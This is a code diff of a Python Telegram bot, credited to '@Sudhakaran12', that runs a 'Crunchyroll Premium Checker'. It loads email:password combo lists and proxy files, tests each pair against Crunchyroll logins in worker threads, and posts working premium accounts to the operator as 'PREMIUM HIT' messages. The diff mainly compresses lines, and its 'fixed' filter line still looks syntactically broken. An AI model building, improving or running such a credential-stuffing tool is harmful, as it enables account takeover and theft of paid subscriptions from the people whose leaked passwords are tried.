@@ -66,6 +66,7 @@ class CrunchyrollChecker:
         return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
 
     def check(self, email, password):
+        # Your original check logic (kept exactly the same)
         device_id = str(uuid.uuid4())
         session = requests.Session()
         
@@ -210,31 +211,25 @@ CHECKED BY: @Sudhakaran12
     return capture
 
 
+# ====================== BOT ======================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "🚀 <b>Crunchyroll Premium Checker</b>\n\nBot made by @Sudhakaran12",
-        parse_mode=ParseMode.HTML
-    )
+    await update.message.reply_text("🚀 <b>Crunchyroll Premium Checker</b>\n\nBot made by @Sudhakaran12", parse_mode=ParseMode.HTML)
 
 
 async def check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("❌ Unauthorized!")
-        return
+    if update.effective_user.id != OWNER_ID: return await update.message.reply_text("❌ Unauthorized!")
     await update.message.reply_text("📤 Send combo file or paste combos")
     context.user_data['waiting'] = 'combo'
 
 
 async def proxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != OWNER_ID:
-        return
+    if update.effective_user.id != OWNER_ID: return
     await update.message.reply_text("📤 Send proxy file")
     context.user_data['waiting'] = 'proxy'
 
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != OWNER_ID:
-        return
+    if update.effective_user.id != OWNER_ID: return
     file = await update.message.document.get_file()
     filename = f"temp_{update.message.document.file_name}"
     await file.download_to_drive(filename)
@@ -257,8 +252,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != OWNER_ID:
-        return
+    if update.effective_user.id != OWNER_ID: return
     text = update.message.text.strip()
     if context.user_data.get('waiting') == 'combo' and ':' in text:
         combos = [line.strip() for line in text.splitlines() if ':' in line]
@@ -269,12 +263,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def startcheck_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != OWNER_ID:
-        return
+    if update.effective_user.id != OWNER_ID: return
     combos = context.user_data.get('combos', [])
     if not combos:
-        await update.message.reply_text("❌ No combos! Use /check first.")
-        return
+        return await update.message.reply_text("❌ No combos! Use /check first.")
 
     await update.message.reply_text(f"🚀 Starting check...\nCombos: {len(combos)}\nProxies: {len(active_proxies) or 'None'}")
 
@@ -283,8 +275,7 @@ async def startcheck_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 def run_checker(combos, chat_id, bot):
     q = Queue()
-    for c in combos:
-        q.put(c)
+    for c in combos: q.put(c)
 
     stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0}
 
@@ -300,15 +291,10 @@ def run_checker(combos, chat_id, bot):
                 result = checker.check(email.strip(), password.strip())
 
                 stats['checked'] += 1
-
                 if result['status'] == 'PREMIUM':
                     stats['premium'] += 1
                     capture = save_hit(result)
-                    asyncio.run(bot.send_message(
-                        chat_id=chat_id,
-                        text=f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>",
-                        parse_mode=ParseMode.HTML
-                    ))
+                    asyncio.run(bot.send_message(chat_id=chat_id, text=f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>", parse_mode=ParseMode.HTML))
                 elif result['status'] == 'FREE':
                     stats['free'] += 1
             except:
@@ -322,11 +308,7 @@ def run_checker(combos, chat_id, bot):
 
     q.join()
 
-    asyncio.run(bot.send_message(
-        chat_id=chat_id,
-        text=f"✅ <b>CHECK FINISHED!</b>\n\nChecked: {stats['checked']}\nPremium: {stats['premium']}\nFree: {stats['free']}\nInvalid: {stats['invalid']}",
-        parse_mode=ParseMode.HTML
-    ))
+    asyncio.run(bot.send_message(chat_id=chat_id, text=f"✅ <b>CHECK FINISHED!</b>\n\nChecked: {stats['checked']}\nPremium: {stats['premium']}\nFree: {stats['free']}\nInvalid: {stats['invalid']}", parse_mode=ParseMode.HTML))
 
 
 def main():
@@ -344,7 +326,10 @@ def main():
     app.add_handler(CommandHandler("proxies", proxies_cmd))
     app.add_handler(CommandHandler("startcheck", startcheck_cmd))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
-    app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))
+    
+    # FIXED LINE - No tilde on same line
+    text_filter = filters.TEXT & \~filters.COMMAND
+    app.add_handler(MessageHandler(text_filter, handle_message))
 
     print("🤖 Bot Started | Made by @Sudhakaran12")
     app.run_polling()
